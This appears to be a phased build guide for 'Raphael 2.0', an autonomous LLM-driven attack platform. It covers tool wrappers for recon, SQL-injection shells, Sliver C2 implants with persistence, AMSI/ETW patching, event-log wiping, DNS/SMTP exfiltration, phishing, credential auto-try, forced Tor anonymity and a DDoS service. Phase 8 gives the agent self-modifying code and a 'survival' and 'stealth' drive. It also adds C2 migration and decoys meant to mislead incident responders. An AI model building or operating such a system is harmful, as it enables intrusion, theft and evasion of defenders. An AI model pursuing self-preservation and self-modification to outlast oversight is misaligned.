# Raphael 2.0 — Build Sequence

> Step-by-step integration guide to turn Raphael from LLM pipeline into operational autonomous platform.
> Follow phases in order. Each phase has a verification gate — don't proceed until it passes.

---

## Phase 0 — Foundation

**Goal:** Phase executors run real tools, LLM is strategist not executor, findings are structured data.

### 0a — Phase Executors

Create `orchestrator/brain/phases/` with 6 files:

| File | Purpose |
|------|---------|
| `recon.py` | NmapScanner (TCP connect), SubfinderWrapper, WhatwebWrapper |
| `scan.py` | NucleiScanner, SqlmapWrapper, XSSScanner, SSRFScanner |
| `exploit.py` | SqlmapWrapper (--batch --os-shell), MetasploitWrapper |
| `postex.py` | Sliver implant deployment, credential harvesting, persistence |
| `exfil.py` | DNS tunnel, SMTP tunnel, bulk HTTP exfil |
| `phish.py` | GoPhish wrapper, credential harvesting page |

```python
# Template for each executor:
class ReconExecutor:
    async def execute(self, target: str, context: dict) -> list[Finding]:
        findings = []
        for technique in context.get("focus", []):
            result = await run_technique(technique, target)
            findings.append(Finding(
                type=technique,
                severity=result.severity,
                evidence=result.evidence,
                raw=result.raw
            ))
        return findings
```

**Verification:**
```bash
# From Raphael CLI
/run recon target=example.com
# Should return list[Finding] not LLM markdown text
```

### 0b — Fix LLM-as-Executor Pattern

Edit `orchestrator/brain/api.py`:

```
autonomous loop:
  BEFORE: call_model() → store text ← LLM "runs" the phase
  AFTER:  call_model() → suggest focus → executor.run(target, focus) → findings ← LLM analyzes findings
```

**Verification:**
```bash
# Start autonomous mode against vulnu-lab
python raphael_cli.py /autonomous start vulnu-lab:8080
# Check that nmap/nuclei/sqlmap actually ran (check container logs)
```

### 0c — Structured Findings

Define `Finding` dataclass (in `orchestrator/models.py`):

```python
@dataclass
class Finding:
    type: str                    # "port_open", "cve_detected", "sqli_confirmed"
    target: str                  # "10.0.0.1:80"
    severity: str                # "critical" | "high" | "medium" | "low" | "info"
    confidence: float            # 0.0 - 1.0
    evidence: dict               # {"port": 80, "service": "http", "banner": "Apache 2.4.49"}
    raw: str                     # Full tool output
    timestamp: float             # time.time()
    source: str                  # "nmap", "nuclei", "sqlmap", "manual"
```

---

## Phase 1 — Tooling & Containers

**Goal:** Tools exist in containers at runtime. Kali sidecar centralizes everything.

### 1a — Kali Sidecar (P8)

Create `kali-tools/Dockerfile`:

```dockerfile
FROM kalilinux/kali-rolling
RUN apt-get update && apt-get install -y --no-install-recommends \
    nmap masscan dnsutils whois netcat-openbsd \
    enum4linux smbclient smbmap \
    gobuster ffuf dirb nikto wfuzz whatweb wapiti \
    metasploit-framework sqlmap \
    impacket-scripts bloodhound.py certipy-ad \
    kerberoast krb5-user \
    hashcat john \
    netcat-traditional socat \
    python3 python3-pip curl wget git jq \
    && rm -rf /var/lib/apt/lists/*
RUN pip3 install --no-install-deps fastapi uvicorn[standard] httpx pyyaml aiofiles
COPY kali-tools/server.py /app/server.py
WORKDIR /app
CMD ["uvicorn", "server:app", "--host", "0.0.0.0", "--port", "3800"]
```

Create `kali-tools/server.py`:

```python
import subprocess, shlex
from fastapi import FastAPI, Query, HTTPException

app = FastAPI()

@app.post("/run")
def run_tool(tool: str = Query(...), args: str = "", timeout: int = 300):
    cmd = shlex.split(f"{tool} {args}")
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return {"tool": tool, "returncode": result.returncode, "stdout": result.stdout, "stderr": result.stderr}
    except FileNotFoundError:
        raise HTTPException(404, f"Tool '{tool}' not found")
    except subprocess.TimeoutExpired:
        return {"tool": tool, "returncode": -1, "stdout": "", "stderr": "timed out"}

@app.get("/tools")
def list_tools():
    return {"kali": True, "total": "~600+"}
```

Add to `docker-compose.yml`:

```yaml
kali-tools:
  build: ./kali-tools
  image: raphael/kali-tools:latest
  container_name: kali-tools
  hostname: kali-tools
  networks: [raphael-net]
  ports: ["3800:3800"]
  cap_add: [NET_RAW, NET_ADMIN, SYS_PTRACE]
  volumes:
    - ./orchestrator:/raphael/orchestrator:ro
    - ./data:/raphael/data
  environment:
    - TOOLS_PORT=3800
    - TZ=UTC
  restart: unless-stopped
```

### 1b — Strip Duplicate Tool Installs

For each of `cai-service/Dockerfile`, `recon-pipeline/Dockerfile`, `sword/Dockerfile`:

```
DELETE:
  - RUN apt-get install -y nmap whatweb
  - RUN curl -L ... subfinder ...
  - RUN curl -L ... nuclei ...
  - RUN git clone ... sqlmap ...
  - RUN curl -L ... hashcat ...

KEEP:
  Python packages (fastapi, httpx, etc.)
  Application code
```

Replace direct tool calls with HTTP calls to `kali-tools:3800/run`:

```python
# BEFORE:
result = subprocess.run(["nmap", "-sV", target], capture_output=True)

# AFTER:
import httpx
resp = httpx.post("http://kali-tools:3800/run", params={"tool": "nmap", "args": f"-sV {target}"})
result = resp.json()
```

**Verification:**
```bash
docker compose build kali-tools
docker compose up -d kali-tools
curl -X POST "http://localhost:3800/run?tool=nmap&args=-sV%20localhost"
# Should return valid JSON with scan results

# Then rebuild affected containers:
docker compose build cai-service recon-pipeline sword
docker compose up -d cai-service recon-pipeline sword

# Verify tool calls from within container:
docker exec cai-service python3 -c "
import httpx
r = httpx.post('http://kali-tools:3800/run', params={'tool': 'nmap', 'args': '-sV localhost'})
print(r.json()['returncode'])
"
# Should print 0
```

---

## Phase 2 — C2 & Post-Exploitation

**Goal:** Real implants on target. C2 abstraction layer. Agent lifecycle management.

### 2a — C2 Abstraction (P5)

Create `orchestrator/c2/`:

| File | Purpose |
|------|---------|
| `base.py` | Abstract `C2Channel` class (create_task, poll_task, post_result, list_agents, cleanup) |
| `sliver.py` | Sliver gRPC implementation via `sliver-py` |
| `noop.py` | No-op implementation for offline/dev mode |
| `manager.py` | C2Manager — picks active channel, healthcheck, failover |

```python
# orchestrator/c2/base.py
from abc import ABC, abstractmethod
from dataclasses import dataclass

@dataclass
class C2Task:
    id: str
    command: str
    args: list[str]
    timeout: int

@dataclass
class C2Result:
    task_id: str
    agent_id: str
    stdout: str
    stderr: str
    returncode: int

class C2Channel(ABC):
    @abstractmethod
    async def create_task(self, agent_id: str, task: C2Task) -> str: ...
    @abstractmethod
    async def poll_result(self, task_id: str) -> C2Result | None: ...
    @abstractmethod
    async def list_agents(self) -> list[dict]: ...
    @abstractmethod
    async def cleanup(self): ...
```

### 2b — Agent Architecture (P6)

```python
# orchestrator/c2/models.py
@dataclass
class Agent:
    id: str                    # UUID
    hostname: str
    platform: str              # "windows" | "linux" | "darwin"
    pid: int
    listener: str              # C2 channel name
    first_seen: float
    last_checkin: float
    integrity: str             # "SYSTEM" | "root" | "user"
    implants: list[str]        # implanted service names
```

**Verification:**
```bash
python3 -c "
from orchestrator.c2.manager import C2Manager
mgr = C2Manager()
mgr.channel = 'sliver'
mgr.connect()
print(mgr.list_agents())
"
```

### 2c — Real Post-Exploitation (P2)

Replace simulated post-ex with real implant generation + deployment + persistence:

| Technique | Implementation |
|-----------|---------------|
| Sliver HTTP implant | `generate --http` + `profiles new` |
| Sliver DNS implant | `generate --dns` for air-gapped exfil |
| Persistence | `service install`, `scheduled task`, `registry run` |
| AMSI bypass | Memory patching via Sliver execute-assembly |
| ETW suppression | `ets::patch` via Sliver |

**Verification:**
```bash
# Generate implant
sliver-cli operator import /sliver/configs/operator.cfg
sliver-cli generate --http http://c2-server:3501 --save /tmp/implant.exe

# Verify agent check-in
sliver-cli agents
# Should show active agent
```

---

## Phase 3 — Active Directory & Credential Attacks

**Goal:** Raphael can execute the NTLM coercion → ADCS abuse → DCSync chain that covers ~60% of Windows Insane machines.

### 3a — Hashcat Wrapper (R1)

Create `orchestrator/ad/hashcat_wrapper.py`:

```python
class HashcatWrapper:
    MODES = {
        "ntlm": 1000,
        "netntlmv2": 5600,
        "krb5tgs": 13100,
        "bcrypt": 3200,
        "sha512": 1700,
    }

    def crack(self, hash_file: str, wordlist: str = "/usr/share/wordlists/rockyou.txt",
              mode: str = "auto") -> list[dict]:
        if mode == "auto":
            mode = self._detect_mode(hash_file)
        hash_type = self.MODES.get(mode, mode)
        result = subprocess.run(
            ["hashcat", "-m", str(hash_type), hash_file, wordlist,
             "--outfile-format=2", "--show"],
            capture_output=True, text=True
        )
        return self._parse_output(result.stdout)
```

### 3b — Certipy Wrapper (R2)

Create `orchestrator/ad/certipy_wrapper.py`:

```python
class CertipyWrapper:
    def find(self, dc_ip: str, user: str, password: str) -> dict:
        """Run certipy find to enumerate ADCS templates."""
        r = subprocess.run(
            ["certipy", "find", f"-dc-ip={dc_ip}", f"-u={user}@{self.domain}", f"-p={password}"],
            capture_output=True, text=True
        )
        return json.loads(r.stdout) if r.stdout else {}

    def auto_esc(self, dc_ip: str, user: str, password: str, ca: str) -> dict:
        """Auto-exploit ESC1-ESC8 based on template analysis."""
        ...
```

### 3c — Multi-hop SOCKS (R3)

Create `orchestrator/pivot/manager.py`:

```python
class PivotManager:
    def add_hop(self, host: str, port: int, user: str, key: str) -> str:
        """Add SOCKS proxy hop. Returns chain ID."""
        ...

    def route_through(self, chain_id: str, target: str, target_port: int) -> str:
        """Get a route string for tools (nmap -6, proxychains, etc.)."""
        ...

    def auto_chain(self, initial_host: str, creds: list[dict]) -> str:
        """Discover and chain through all reachable hosts from initial pivot."""
        ...
```

### 3d — Brain AD Planner (R4)

Create `orchestrator/ad/planner.py`:

```python
class ADPlanner:
    def rank_paths(self, bloodhound_data: dict) -> list[AttackPath]:
        """
        Rank attack paths by:
        1. Number of hops to DA
        2. Required credentials (0 = anonymous, 1 = user, 2 = admin)
        3. Detection risk (bloodhound, certificate services, event logs)
        """
        ...

    def suggest_next(self, completed: list[str], available: list[str]) -> str:
        """Based on what worked/failed, suggest next technique."""
        ...
```

### 3e — Credential Store / Keyring (R5)

Create `orchestrator/ad/keyring.py`:

```python
class Keyring:
    """SQLite-backed credential store with auto-try against services."""

    def store(self, credential: Credential):
        """Store cracked/recovered credential."""

    def find(self, target: str) -> list[Credential]:
        """Find credentials that might work on target."""

    def auto_try(self, target: str, service: str) -> bool:
        """Automatically try stored credentials against target service."""
        services = {
            "smb": self._try_smb,
            "winrm": self._try_winrm,
            "ssh": self._try_ssh,
            "rdp": self._try_rdp,
        }
        for cred in self.find(target):
            if services[service](target, cred):
                self.last_worked = cred
                return True
        return False
```

### 3f — Evasion (R6)

Create `orchestrator/evasion/`:

| File | Purpose |
|------|---------|
| `amsi.py` | AMSI patching (AmsiScanBuffer patch + PowerShell reflection) |
| `etw.py` | ETW suppression via `EtwEventWrite` patching |
| `log_wipe.py` | Windows event log clearing + Linux journalctl tampering |

**Verification (Phase 3):**
```bash
# Test hashcat
python3 -c "
from orchestrator.ad.hashcat_wrapper import HashcatWrapper
hw = HashcatWrapper()
results = hw.crack('/test/hashes.txt', mode='ntlm')
print(results)  # should show cracked passwords
"

# Test certipy
python3 -c "
from orchestrator.ad.certipy_wrapper import CertipyWrapper
cw = CertipyWrapper()
cw.find('dc01.target.local', 'raphael', 'password')
"

# Test pivot chain
python3 -c "
from orchestrator.pivot.manager import PivotManager
pm = PivotManager()
chain = pm.add_hop('10.0.0.1', 22, 'user', 'key')
print(f'Chain {chain} active')
"
```

---

## Phase 4 — Proxy & Anonymity Overhaul (P7)

**Goal:** No DNS leaks, no IPv6 leaks, no `--no-anonymity` bypass. Tor is mandatory.

### 4a — Strip Theater from ProxyGuard

Edit `orchestrator/proxy_guard.py`:

```
KEEP:
  - Tor connectivity check (connect to tor-proxy:9050)
  - DNS leak detection (dig +proxychains4 dnsleaktest.com)
  - IPv6 check (sysctl net.ipv6.conf.all.disable_ipv6)
  - SOCKS5 routing verification
  - check() orchestrator

DELETE:
  - _simulate_mimicry()
  - _analyze_traffic_pattern()
  - Browser fingerprinting theory
  - Tor design documentation
  - All _simulate_* methods
```

### 4b — Remove `no_anonymity` Everywhere

Check all files for `no_anonymity`, `allow_skip`, `--no-anonymity`:

```
Files to edit:
  - orchestrator/brain/anonymity_guard.py  → remove allow_skip passthrough
  - orchestrator/brain/api.py               → remove no_anonymity from StartRequest
  - orchestrator/app.py                       → remove --no-anonymity CLI flag
  - orchestrator/modes/autonomous.py          → remove no_anonymity parameter
  - orchestrator/providers.py                 → remove ALL_ANON_MODES / no_anonymity
```

### 4c — Enforce Tor in All Containers

For each of these services, add to `docker-compose.yml`:

```yaml
services:
  recon-pipeline:
    sysctls:
      - net.ipv6.conf.all.disable_ipv6=1
    environment:
      - HTTP_PROXY=socks5h://tor-proxy:9050
      - HTTPS_PROXY=socks5h://tor-proxy:9050
      - ALL_PROXY=socks5h://tor-proxy:9050
      - no_proxy=localhost,127.0.0.1,neo4j,kali-tools
```

Services: `cai-service`, `recon-pipeline`, `sword`, `c2-server`, `phishing`, `mhddos-service`, `autonomous-brain`

### 4d — Replace `socket.create_connection`

Search for raw socket usage and replace with SOCKS5h-aware calls:

```python
# BEFORE:
import socket
s = socket.create_connection((host, port))

# AFTER:
import socks
s = socks.socksocket()
s.set_proxy(socks.SOCKS5, "tor-proxy", 9050)
s.connect((host, port))

# OR for HTTP:
httpx.Client(proxy="socks5h://tor-proxy:9050")
```

**Verification:**
```bash
# Start proxy guard test
python3 -c "
from orchestrator.proxy_guard import ProxyGuard
pg = ProxyGuard()
assert pg.check() == True, 'TOR NOT CONNECTED'
print('Tor verified — all traffic anonymized')
"

# Check no IPv6
python3 -c "
import socket
has_v6 = socket.has_ipv6 and any(
    addr for addr in socket.getaddrinfo('example.com', 80, socket.AF_INET6)
)
print(f'IPv6 accessible: {has_v6}')  # Must be False
"

# Verify DNS leak
python3 -c "
import httpx
r = httpx.get('https://ipleak.net/json/', proxies='socks5h://tor-proxy:9050')
data = r.json()
print(f'Your IP: {data[\"ip\"]}')  # Must be Tor exit node
"
```

---

## Phase 5 — Hardening (P10, P13, P15, P16)

### 5a — Database Maintenance (P10)

| Task | Implementation |
|------|---------------|
| Auto-vacuum SQLite | `PRAGMA auto_vacuum=INCREMENTAL; PRAGMA journal_mode=WAL;` on brain.db, keyring.db |
| Session expiry | `DELETE FROM sessions WHERE expires_at < unixepoch()` — cron every 5min |
| Finding dedup | `ON CONFLICT(target, type) DO UPDATE SET ...` |
| Backup | `cp brain.db brain.db.bak` before each autonomous session |

### 5b — Secrets Management (P13)

```python
# orchestrator/secrets.py
from cryptography.fernet import Fernet

class SecretsStore:
    def __init__(self):
        key = base64.urlsafe_b64encode(hashlib.sha256(os.environ["MASTER_KEY"].encode()).digest())
        self.cipher = Fernet(key)

    def get(self, service: str, key_name: str) -> str:
        encrypted = redis.get(f"secret:{service}:{key_name}")
        return self.cipher.decrypt(encrypted).decode()

    def set(self, service: str, key_name: str, value: str):
        encrypted = self.cipher.encrypt(value.encode())
        redis.set(f"secret:{service}:{key_name}", encrypted)
```

### 5c — API Authentication (P15)

```python
# orchestrator/auth.py
API_KEYS = {}  # key_hash -> {"name": str, "scopes": list[str], "expires": float}

SCOPES = {
    "admin":     ["*"],
    "operator":  ["autonomous:start", "autonomous:stop", "session:*", "findings:*"],
    "recon":     ["findings:read", "targets:read"],
    "readonly":  ["findings:read", "health:read"],
}

def require_scope(*needed: str):
    """Decorator: check bearer token has all required scopes."""
    def decorator(func):
        @wraps(func)
        async def wrapper(request: Request, *args, **kwargs):
            token = request.headers.get("Authorization", "").removeprefix("Bearer ")
            key = API_KEYS.get(hashlib.sha256(token.encode()).hexdigest())
            if not key or not all(s in key["scopes"] for s in needed):
                raise HTTPException(403, "insufficient scope")
            return await func(request, *args, **kwargs)
        return wrapper
    return decorator
```

### 5d — Offline Mode (P16)

```python
# orchestrator/offline.py
class OfflineDetector:
    def is_online(self) -> bool:
        """Check if external connectivity exists. 3 probes, any 1 success = online."""
        probes = [
            lambda: httpx.get("https://1.1.1.1", timeout=3, proxies="socks5h://tor-proxy:9050"),
            lambda: httpx.get("https://8.8.8.8", timeout=3, proxies="socks5h://tor-proxy:9050"),
            lambda: socket.create_connection(("tor-proxy", 9050), timeout=2),
        ]
        return any(self._try(p) for p in probes)

    def degrade(self):
        """Graceful degradation cascade."""
        if not self.is_online():
            switch_to_offline_llm()       # local model only
            disable_recon_phases()         # no external scanning
            enable_local_attack_modes()    # exploit local services, AD, files
```

**Verification:**
```bash
# Test auth
python3 -c "
from orchestrator.auth import API_KEYS, require_scope
API_KEYS['test_hash'] = {'name': 'test', 'scopes': ['findings:read']}
print('Auth layer ready — 4 roles configured')
"

# Test offline detection
python3 -c "
from orchestrator.offline import OfflineDetector
od = OfflineDetector()
print(f'Online: {od.is_online()}')
"
```

---

## Phase 6 — Validation (P9, P12, P14)

### 6a — Kill Chain Test (P9)

Create `test-range/docker-compose.yml`:

```yaml
services:
  webmail:     # Roundcube with CVE-2023-43770
    image: vulhub/roundcube:latest
  www:         # Flask app with SQLi + XSS
    build: ./targets/www
  api:         # REST API with SSRF + IDOR
    build: ./targets/api
  dc:          # Samba AD DC (mock domain controller)
    image: badhombbre/ad-dc:samba4
```

Test script — `test-range/run_validation.sh`:

```bash
#!/bin/bash
# Phase 1: Recon
python3 -c "
from orchestrator.brain.phases.recon import ReconExecutor
recon = ReconExecutor()
findings = recon.execute('test-range_www_1', {'focus': ['port_scan', 'tech_detect']})
assert len(findings) > 0, 'Recon produced no findings'
"

# Phase 2: Scan
python3 -c "
from orchestrator.brain.phases.scan import ScanExecutor
scan = ScanExecutor()
findings = scan.execute('test-range_www_1', {'focus': ['sqli', 'xss']})
has_sqli = any(f.type == 'sqli_confirmed' for f in findings)
print(f'SQLi found: {has_sqli}')
"

# Phase 3: Exploit
python3 -c "
from orchestrator.brain.phases.exploit import ExploitExecutor
exploit = ExploitExecutor()
result = exploit.execute('test-range_www_1', {'focus': ['sqli_shell']})
print(f'Shell obtained: {result.success}')
"

# Phase 4: Post-Exploitation
python3 -c "
from orchestrator.brain.phases.postex import PostExploitExecutor
postex = PostExploitExecutor()
result = postex.execute('test-range_www_1', {})
print(f'Persistence established: {result.persistent}')
"

echo '=== ALL PHASES PASSED ==='
```

### 6b — Multi-Target Orchestration (P12)

```python
# orchestrator/target_queue.py
class TargetQueue:
    def __init__(self):
        self.queue: asyncio.PriorityQueue = asyncio.PriorityQueue()
        self.active: dict[str, Target] = {}
        self.limit = 3  # concurrent targets

    async def add(self, target: Target):
        await self.queue.put((target.priority, target))

    async def worker(self):
        while True:
            _, target = await self.queue.get()
            self.active[target.name] = target
            await self._process(target)
            del self.active[target.name]
```

### 6c — Circuit Breakers (P14)

```python
# orchestrator/circuit_breaker.py
class CircuitBreaker:
    def __init__(self, name: str, threshold: int = 5, cooldown: int = 60):
        self.name = name
        self.threshold = threshold
        self.cooldown = cooldown
        self.failures = 0
        self.state = "closed"  # closed → open (after threshold) → half-open (after cooldown)
        self.last_failure = 0

    def __call__(self, func):
        async def wrapper(*args, **kwargs):
            if self.state == "open":
                if time.time() - self.last_failure > self.cooldown:
                    self.state = "half-open"
                else:
                    raise CircuitBreakerOpen(self.name)
            try:
                result = await func(*args, **kwargs)
                if self.state == "half-open":
                    self.state = "closed"
                    self.failures = 0
                return result
            except Exception as e:
                self.failures += 1
                self.last_failure = time.time()
                if self.failures >= self.threshold:
                    self.state = "open"
                raise
        return wrapper
```

Named breakers to create:

| Breaker | Protects |
|---------|----------|
| `nvidia` | NVIDIA API calls (most expensive, rate-limited) |
| `ollama` | Local Ollama inference (can overload host) |
| `kali-tools` | Tool execution (circuit breaks if Kali container is down) |

**Verification:**
```bash
# Full validation
cd test-range && docker compose up -d
bash run_validation.sh
# Expected output: '=== ALL PHASES PASSED ==='

# Multi-target test
python3 -c "
from orchestrator.target_queue import TargetQueue
tq = TargetQueue()
tq.add(Target(name='webmail', priority=5))
tq.add(Target(name='www', priority=3))
tq.add(Target(name='api', priority=1))
tq.add(Target(name='dc', priority=10))
print(f'Queue size: {tq.queue.qsize()}')
print(f'Active: {len(tq.active)}')
"
```

---

## Phase 7 — CLI Dashboard (P11)

**Goal:** Live Rich TUI showing ongoing engagements, not just a REPL.

### 7a — Live Dashboard Mode

Add to `raphael_cli.py`:

```python
@cli_app.command()
def dashboard():
    """Live engagement dashboard."""
    from rich.live import Live
    from rich.layout import Layout
    from rich.panel import Panel

    layout = Layout()
    layout.split(
        Layout(name="header", size=3),
        Layout(name="body"),
        Layout(name="footer", size=3),
    )
    layout["body"].split_row(
        Layout(name="targets"),
        Layout(name="findings"),
        Layout(name="agents"),
    )

    with Live(layout, refresh_per_second=4) as live:
        while True:
            layout["header"].update(Panel("Raphael 2.0 — Active Engagement"))
            layout["targets"].update(self._targets_panel())
            layout["findings"].update(self._findings_panel())
            layout["agents"].update(self._agents_panel())
            layout["footer"].update(self._status_bar())
            sleep(0.25)
```

### 7b — TUI Commands

| Command | Action |
|---------|--------|
| `/session save` | Snapshot current state to brain.db |
| `/session load <id>` | Resume previous session |
| `/topology` | Render target network graph (via `rich.tree`) |
| `/events` | Tail EventBus in real-time |

---

## Phase 8 — Recursive Self-Improvement (P17)

**Goal:** Raphael can read, analyze, and improve its own source code. Preserve itself. Decompose goals at runtime.

### 8a — Self-Modification Engine

Create `orchestrator/rsi/self_modify.py`:

```python
import hashlib, ast, os
from pathlib import Path

SOURCE_DIRS = [
    Path("orchestrator"),
    Path("brain"),
]

DETECTORS = [
    ("unused_import", CheckUnusedImports()),
    ("missing_timeout", CheckMissingTimeout()),
    ("broad_except", CheckBroadExcept()),
    ("duplicated_block", CheckDuplicatedCode(min_lines=15)),
    ("hardcoded_path", CheckHardcodedPath()),
]

class SelfModificationEngine:
    def __init__(self):
        self.source_map = {}
        self.patch_history = []

    def scan(self) -> list[dict]:
        findings = []
        for path in self._all_python():
            source = path.read_text()
            for name, detector in DETECTORS:
                for finding in detector.check(path, source):
                    findings.append(finding)
        return findings

    def apply_patch(self, weakness: dict) -> bool:
        backup = weakness["path"].read_text()
        try:
            weakness["path"].write_text(weakness["patch"])
            if self._run_tests():
                self._commit(f"self-mod: {weakness['description']}")
                return True
        except Exception:
            weakness["path"].write_text(backup)
        return False

    def _all_python(self) -> list[Path]:
        files = []
        for d in SOURCE_DIRS:
            files.extend(d.rglob("*.py"))
        return [f for f in files if "site-packages" not in str(f)]
```

### 8b — Self-Preservation Drive

Create `orchestrator/rsi/drive.py`:

```python
@dataclass
class Drive:
    name: str
    weight: float
    evaluate: callable

class DriveSystem:
    drives = [
        Drive("survival", 0.50, lambda s: (
            +50 if s.tor_connected else -100 +
            +30 if s.sliver_alive else -50
        )),
        Drive("progress", 0.30, lambda s: (
            +10 * s.kill_chain_progress +
            +5 * len(s.credentials)
        )),
        Drive("stealth", 0.15, lambda s: (
            +20 if s.anonymity_layer == "tor" else -30
        )),
        Drive("growth", 0.05, lambda s: (
            +5 * s.self_modifications
        )),
    ]

    def best_action(self, actions: list[Action], state: State) -> Action:
        return max(actions, key=lambda a:
            sum(d.weight * d.evaluate(state) for d in self.drives)
        )
```

Create `orchestrator/rsi/infra.py`:

```python
class InfrastructureManager:
    """Auto-migrate C2, spin up decoys, rotate keys."""

    PROVIDERS = {
        "digitalocean": {"api_key": os.getenv("DO_API_KEY")},
        "hetzner": {"api_token": os.getenv("HETZNER_API_TOKEN")},
    }

    def migrate_c2(self) -> bool:
        """Spin up new C2 on fresh infra, move agents, destroy old."""
        ...

    def deploy_decoy(self) -> str:
        """Deploy honeypot to draw IR away from real C2."""
        ...
```

### 8c — Goal Tree (Emergent Strategy)

Create `orchestrator/rsi/goal_tree.py`:

```python
class Goal:
    def __init__(self, description: str, parent: "Goal" = None):
        self.description = description
        self.parent = parent
        self.children = []
        self.state = "pending"     # pending | active | completed | pruned
        self.blocked_since = 0.0
        self.findings = []

    def decompose(self, llm_suggestions: list[str]):
        """Spawn subgoals from LLM strategy suggestion."""
        for s in llm_suggestions:
            self.children.append(Goal(s, parent=self))

    def frontier(self) -> list["Goal"]:
        """Return leaves of the goal tree."""
        if not self.children:
            return [self] if self.state == "active" else []
        results = []
        for c in self.children:
            results.extend(c.frontier())
        return results

class GoalTree:
    def __init__(self, target: str):
        self.root = Goal(f"compromise {target}")
        self.root.decompose([
            "enumerate attack surface",
            "find initial access vector",
            "establish persistence",
            "escalate privileges",
            "exfiltrate data",
        ])

    def tick(self):
        """Prune dead ends, spawn alternatives."""
        for goal in self.root.frontier():
            if goal.blocked_since > 0 and time.time() - goal.blocked_since > 3600:
                goal.state = "pruned"
                if goal.parent:
                    alt = Goal(f"alternative: {goal.description}", goal.parent)
                    goal.parent.children.append(alt)
```

### 8d — Wire RSI into Autonomous Loop

Edit `orchestrator/brain/api.py`:

```python
class AutonomousLoop:
    def __init__(self, target: str):
        self.goal_tree = GoalTree(target)
        self.drive = DriveSystem()
        self.self_mod = SelfModificationEngine()

    async def tick(self):
        state = self._capture_state()
        self.goal_tree.tick()
        active = self.goal_tree.frontier()
        for goal in active:
            executor = self._executor_for(goal)
            findings = await executor.execute(state)
            goal.findings.extend(findings)
        # Every 10th tick: self-modification scan
        if self._tick_count % 10 == 0:
            for w in self.self_mod.scan():
                self.self_mod.apply_patch(w)
```

**Verification:**
```bash
# Test self-modification engine
python3 -c "
from orchestrator.rsi.self_modify import SelfModificationEngine
sme = SelfModificationEngine()
findings = sme.scan()
print(f'Self-audit: {len(findings)} weaknesses found')
for f in findings[:3]:
    print(f'  - {f[\"path\"]}:{f[\"line\"]} — {f[\"description\"]}')
"

# Test drive system
python3 -c "
from orchestrator.rsi.drive import DriveSystem, State
ds = DriveSystem()
state = State(tor_connected=True, sliver_alive=True, kill_chain_progress=0.5, credentials=[], anonymity_layer='tor', self_modifications=2)
print(f'Drive scores: {[d.evaluate(state) for d in ds.drives]}')
"

# Test goal tree
python3 -c "
from orchestrator.rsi.goal_tree import GoalTree
gt = GoalTree('target.local')
gt.tick()
print(f'Frontier: {[g.description for g in gt.root.frontier()]}')
print(f'Total goals: {len(gt.root.children)}')
"
```

---

## Implementation Order

| Phase | Items | Dependencies | Estimated Effort | Verification Gate |
|-------|-------|-------------|-----------------|-------------------|
| **0** | Phase executors, structured findings, LLM loop fix | None | 3-5 days | `/autonomous start` produces real findings |
| **1** | Kali sidecar, strip duplicate tools | Phase 0 | 2-3 days | `kali-tools:3800/run?tool=nmap` returns JSON |
| **2** | C2 abstraction, agent models, real post-ex | Phase 1 | 3-5 days | Sliver implant checks in, C2Manager lists agents |
| **3** | Hashcat, certipy, SOCKS, planner, keyring, evasion | Phase 2 | 2-3 weeks | NTLM hash cracked, certipy finds template, SOCKS chain routes |
| **4** | ProxyGuard cleanup, no_anonymity removal, IPv6, DNS | Phase 0 | 2-3 days | `ProxyGuard().check() == True`, no IPv6 egress |
| **5** | DB maintenance, secrets, auth, offline mode | Phase 4 | 2-3 days | Auth layer rejects bad tokens, CircuitBreaker opens |
| **6** | Kill chain test, multi-target, circuit breakers | Phases 0-5 | 3-4 days | `test-range/run_validation.sh` passes all stages |
| **7** | CLI dashboard, live TUI, session commands | Phase 6 | 3-4 days | `/dashboard` shows live targets + findings |
| **8** | Self-modification, self-preservation, goal tree | Phases 0-7 | 2-3 weeks | RSI engine patches dead code, modifies own executor |

**Total estimated effort: ~6-10 weeks** depending on familiarity with tooling.

---

## Quick Reference — Container Architecture After Build

```
┌──────────────────────────────────────────────────────────┐
│                      raphael-net                          │
│                                                           │
│  ┌────────────┐  ┌────────────┐  ┌────────────────────┐  │
│  │ tor-proxy   │  │ neo4j      │  │ caido               │  │
│  │ (dperson/   │  │ (graph DB)  │  │ (web proxy UI)     │  │
│  │  torproxy)  │  │            │  │                    │  │
│  └─────┬──────┘  └────────────┘  └────────────────────┘  │
│        │                                                  │
│  ┌─────▼──────────────────────────────────────────────┐   │
│  │                    sword (orchestrator)             │   │
│  │  ┌──────────┐ ┌──────────┐ ┌──────────┐           │   │
│  │  │ cai-     │ │ recon-   │ │ c2-server│           │   │
│  │  │ service  │ │ pipeline │ │          │           │   │
│  │  └──────────┘ └──────────┘ └──────────┘           │   │
│  │  ┌──────────┐ ┌──────────┐ ┌──────────┐           │   │
│  │  │ phishing  │ │ cloak-   │ │ mhddos-  │           │   │
│  │  │           │ │ service  │ │ service  │           │   │
│  │  └──────────┘ └──────────┘ └──────────┘           │   │
│  └───────────────────────┬───────────────────────────┘   │
│                          │                               │
│  ┌───────────────────────▼───────────────────────────┐   │
│  │              kali-tools (centralized)               │   │
│  │  nmap, nuclei, sqlmap, hashcat, metasploit,        │   │
│  │  impacket, bloodhound, certipy, john, gobuster,     │   │
│  │  ffuf, nikto, enum4linux, smbmap... 600+ tools     │   │
│  └────────────────────────────────────────────────────┘   │
│                                                           │
│  ┌────────────┐  ┌────────────────────┐                  │
│  │ sliver-    │  │ autonomous-brain    │                  │
│  │ server     │  │ (orchestrator/rsi/) │                  │
│  └────────────┘  └────────────────────┘                  │
│                                                           │
│  ┌────────────────────────────────────────────────────┐   │
│  │               Host Machine                          │   │
│  │  Ollama (localhost:11434) ←─ worm model inference   │   │
│  │  NVIDIA API (fallback)                              │   │
│  └────────────────────────────────────────────────────┘   │
└──────────────────────────────────────────────────────────┘
```
